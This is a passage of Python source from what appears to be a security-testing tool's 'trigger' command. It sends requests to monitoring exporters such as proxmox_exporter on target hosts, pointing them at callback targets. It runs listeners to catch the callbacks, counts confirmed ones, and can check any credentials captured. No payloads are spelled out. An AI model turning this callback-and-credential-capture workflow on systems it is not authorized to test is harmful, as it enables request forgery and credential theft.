        _auto_adjust_listener_services_for_trigger_exporters(args, selected_trigger_exporters, console)
        console.debug(
            "trigger exporters filter=" + ",".join(sorted(str(item.get("name") or "") for item in trigger_exporters))
        )

    plain_hosts: dict[str, list[str]] = {}
    additional_port_hosts: dict[str, list[str]] = {}
    explicit_port_groups: dict[tuple[int, str], list[tuple[str, bool]]] = {}
    for spec in target_specs:
        is_bare_target = spec.scheme is None
        scheme = spec.scheme or "http"
        if spec.explicit_port is None or is_bare_target:
            scheme_hosts = additional_port_hosts.setdefault(scheme, [])
            if spec.host not in scheme_hosts:
                scheme_hosts.append(spec.host)
        if spec.explicit_port is None:
            scheme_hosts = plain_hosts.setdefault(scheme, [])
            if spec.host not in scheme_hosts:
                scheme_hosts.append(spec.host)
            continue
        port_key = int(spec.explicit_port)
        explicit_targets = explicit_port_groups.setdefault((port_key, scheme), [])
        target_key = (spec.host, is_bare_target)
        if target_key not in explicit_targets:
            explicit_targets.append(target_key)

    run_batches: list[tuple[list[str], list[dict[str, Any]], str]] = []
    if custom_ports and additional_port_hosts:
        custom_trigger_exporters = _override_trigger_exporter_ports(trigger_exporters, custom_ports)
        for scheme, scheme_hosts in additional_port_hosts.items():
            run_batches.append((scheme_hosts, custom_trigger_exporters, scheme))
        console.debug("trigger custom ports=" + ",".join(str(int(port)) for port in dict.fromkeys(custom_ports)))
    elif plain_hosts:
        for scheme, scheme_hosts in plain_hosts.items():
            run_batches.append((scheme_hosts, trigger_exporters, scheme))
    custom_port_set = {int(port) for port in custom_ports}
    for (explicit_port, scheme), explicit_targets in explicit_port_groups.items():
        explicit_hosts = [
            host
            for host, is_bare_target in explicit_targets
            if not (is_bare_target and explicit_port in custom_port_set)
        ]
        explicit_hosts = list(dict.fromkeys(explicit_hosts))
        if not explicit_hosts:
            continue
        batch_exporters = _override_trigger_exporter_ports(trigger_exporters, [explicit_port])
        run_batches.append((explicit_hosts, batch_exporters, scheme))
        console.debug("trigger target explicit port=" + str(explicit_port) + " hosts=" + str(len(explicit_hosts)))
    if not run_batches:
        console.error("trigger requires at least one valid target")
        return 2

    if args.with_listen:
        patched_batches: list[tuple[list[str], list[dict[str, Any]], str]] = []
        for batch_hosts, batch_exporters, scheme in run_batches:
            patched_batches.append(
                (batch_hosts, _patch_trigger_exporters_for_with_listen(batch_exporters, args), scheme)
            )
        run_batches = patched_batches
        check_exporters = run_batches[0][1]
        proxmox_tls_enabled = bool(getattr(args, "proxmox_tls", False))
        proxmox_requires_tls = any(
            str(item.get("name") or "").strip().lower() == "proxmox_exporter"
            and str(item.get("trigger_path") or "").strip() == "/pve"
            for item in check_exporters
        )
        if proxmox_requires_tls and not proxmox_tls_enabled:
            console.warn(
                "proxmox callback likely to fail: proxmox_exporter /pve uses HTTPS target; "
                "enable --proxmox-tls to capture proxmox callbacks"
            )
        if args.debug:
            for item in check_exporters:
                query = str(item.get("trigger_query") or "").strip()
                if query:
                    console.debug(
                        f"trigger exporter={item.get('name')} target_fmt={item.get('target_fmt')} trigger_query={query}"
                    )
                else:
                    console.debug(f"trigger exporter={item.get('name')} target_fmt={item.get('target_fmt')}")

    json_sink: LineOutputSink | None = None
    if output_format == "json":
        json_sink = LineOutputSink(
            output_path,
            lambda line: print(line, file=sys.stdout, flush=True),
        )
        try:
            json_sink.prepare()
        except OSError as exc:
            console.error(f"failed to open trigger output: {exc}")
            return 1

    show_trigger_info = output_format == "txt" or not stream_to_stdout
    trigger_progress = None
    trigger_progress_total = sum(
        len(batch_hosts) * len(batch_exporters) for batch_hosts, batch_exporters, _scheme in run_batches
    )

    def _start_trigger_progress() -> None:
        nonlocal trigger_progress
        if output_format != "txt" or trigger_progress is not None:
            return
        trigger_progress = start_command_progress(args, "TRIGGER", trigger_progress_total, enabled=True, leave=True)

    def _advance_trigger_progress(step: int) -> None:
        if trigger_progress is None:
            return
        trigger_progress.advance(max(0, int(step)))

    def _add_trigger_progress_total(step: int) -> None:
        nonlocal trigger_progress_total
        increment = max(0, int(step))
        if increment <= 0:
            return
        trigger_progress_total += increment
        if trigger_progress is not None:
            trigger_progress.set_total(trigger_progress_total)

    def _close_trigger_progress() -> None:
        nonlocal trigger_progress
        if trigger_progress is None:
            return
        trigger_progress.close()
        trigger_progress = None

    if not args.with_listen:
        result_code = 0
        non_listener_summaries: list[dict[str, Any]] = []
        try:
            logger_scope = logger.scoped_console_stream(sys.stderr) if output_format == "json" else nullcontext()
            with logger_scope:
                _start_trigger_progress()
                for batch_hosts, batch_exporters, scheme in run_batches:
                    summary = _run_trigger_requests(
                        args,
                        logger,
                        console,
                        batch_hosts,
                        callback_targets,
                        batch_exporters,
                        show_trigger_info=show_trigger_info,
                        log_trigger_attempts=output_format == "txt" or not stream_to_stdout,
                        record_sink=json_sink,
                        progress_advance=_advance_trigger_progress,
                        progress_add_total=_add_trigger_progress_total,
                        scheme=scheme,
                        tls_context=tls_context,
                    )
                    if isinstance(summary, dict):
                        non_listener_summaries.append(summary)
        except _TriggerOutputError as exc:
            console.error(f"failed to write trigger output: {exc}")
            result_code = 1
        finally:
            _close_trigger_progress()
            if json_sink is not None:
                try:
                    json_sink.close()
                except OSError as exc:
                    console.error(f"failed to close trigger output: {exc}")
                    result_code = 1
        attempted = sum(int(item.get("attempted", 0)) for item in non_listener_summaries)
        confirmed = sum(int(item.get("triggered", 0)) for item in non_listener_summaries)
        if result_code == 0 and attempted > 0 and confirmed == 0:
            console.error("trigger inconclusive: no callback attempt was confirmed")
            result_code = 1
        return result_code

    running: list[RunningServer] = []
    temp_cert_dir: str | None = None
    result_code = 0
    trigger_summaries: list[dict[str, Any]] = []
    reconciled = False

    def _reconcile_listener_results() -> None:
        nonlocal reconciled, result_code
        if reconciled or not trigger_summaries:
            return
        reconciled = True
        attempted = sum(int(item.get("attempted", 0)) for item in trigger_summaries)
        accepted = sum(int(item.get("accepted", 0)) for item in trigger_summaries)
        probe_confirmed = sum(int(item.get("triggered", 0)) for item in trigger_summaries)
        hard_failed = sum(int(item.get("failed", 0)) for item in trigger_summaries)
        callback_stats = _correlated_callback_stats(
            trigger_summaries,
            logger.get_trigger_callback_events(),
        )
        by_service = callback_stats.get("by_service", {})
        attempts_by_service: dict[str, int] = {}
        for summary in trigger_summaries:
            by_exporter = summary.get("by_exporter")
            if not isinstance(by_exporter, dict):
                continue
            for exporter_name, exporter_stats in by_exporter.items():
                if not isinstance(exporter_stats, dict):
                    continue
                service_name = _EXPORTER_TO_LISTENER_SERVICE.get(str(exporter_name))
                if service_name is None:
                    continue
                attempted_for_exporter = int(exporter_stats.get("attempted", 0))
                attempts_by_service[service_name] = attempts_by_service.get(service_name, 0) + attempted_for_exporter
        callback_confirmed = sum(
            min(service_attempts, int(by_service.get(service_name, 0)))
            for service_name, service_attempts in attempts_by_service.items()
        )
        if not attempts_by_service:
            callback_confirmed = min(attempted, int(callback_stats.get("total", 0)))
        callback_confirmed = min(attempted, callback_confirmed)
        remaining = max(0, attempted - callback_confirmed)
        failed = min(hard_failed, remaining)
        unconfirmed = max(0, remaining - failed)
        console.info(
            "trigger complete: "
            f"attempts={attempted} accepted={accepted} probe_confirmed={probe_confirmed} "
            f"callback_confirmed={callback_confirmed} unconfirmed={unconfirmed} fail={failed}"
        )
        if json_sink is not None:
            payload = {
                "timestamp": utc_now_iso(),
                "type": "summary",
                "source_type": "trigger",
                "attempted": attempted,
                "accepted": accepted,
                "probe_confirmed": probe_confirmed,
                "callback_confirmed": callback_confirmed,
                "unconfirmed": unconfirmed,
                "failed": failed,
            }
            try:
                json_sink.emit_many([json.dumps(payload, ensure_ascii=False)])
            except (OSError, TypeError, ValueError) as exc:
                console.error(f"failed to write trigger output: {exc}")
                result_code = 1
        if result_code == 0 and attempted > 0 and max(probe_confirmed, callback_confirmed) == 0:
            console.error("trigger inconclusive: no callback attempt was confirmed")
            result_code = 1

    logger_scope = logger.scoped_console_stream(sys.stderr) if output_format == "json" else nullcontext()
    with logger_scope:
        try:
            logger.set_trigger_callback_mode(
                True,
                callback_targets=callback_targets,
                deduplicate=not args.debug,
            )
            running, temp_cert_dir = start_listeners_for_trigger(args, logger, console)
            _start_trigger_progress()
            for batch_hosts, batch_exporters, scheme in run_batches:
                summary = _run_trigger_requests(
                    args,
                    logger,
                    console,
                    batch_hosts,
                    callback_targets,
                    batch_exporters,
                    # A listener-backed result cannot be finalised until the
                    # observation window has ended.
                    show_trigger_info=False,
                    log_trigger_attempts=False,
                    record_sink=json_sink,
                    progress_advance=_advance_trigger_progress,
                    progress_add_total=_add_trigger_progress_total,
                    scheme=scheme,
                    tls_context=tls_context,
                )
                if isinstance(summary, dict):
                    trigger_summaries.append(summary)
            _close_trigger_progress()
            if listen_seconds is not None:
                console.info(f"listeners are up; waiting for incoming events ({listen_seconds:.1f}s)")
                deadline = time.monotonic() + float(listen_seconds)
                while True:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        break
                    time.sleep(min(1.0, remaining))
                console.info("listen window elapsed; stopping listeners...")
                _reconcile_listener_results()
                if getattr(args, "check_credentials", False):
                    _run_trigger_credential_checks(args, logger, console)
            else:
                console.info("listeners are up; waiting for incoming events (Ctrl+C to stop)")
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            console.info("stopping listeners...")
            _reconcile_listener_results()
            if getattr(args, "check_credentials", False):
                _run_trigger_credential_checks(args, logger, console)
        except _TriggerOutputError as exc:
            console.error(f"failed to write trigger output: {exc}")
            result_code = 1
        except OSError as exc:
            console.error(f"failed to start service: {exc}")
            result_code = 1
        except ValueError as exc:
            console.error(str(exc))
            result_code = 2
        finally:
            _close_trigger_progress()
            _reconcile_listener_results()
            logger.set_trigger_callback_mode(False)
            stop_started_listeners(running, temp_cert_dir)
            if json_sink is not None:
                try:
                    json_sink.close()
                except OSError as exc:
                    console.error(f"failed to close trigger output: {exc}")
                    result_code = 1

    return result_code
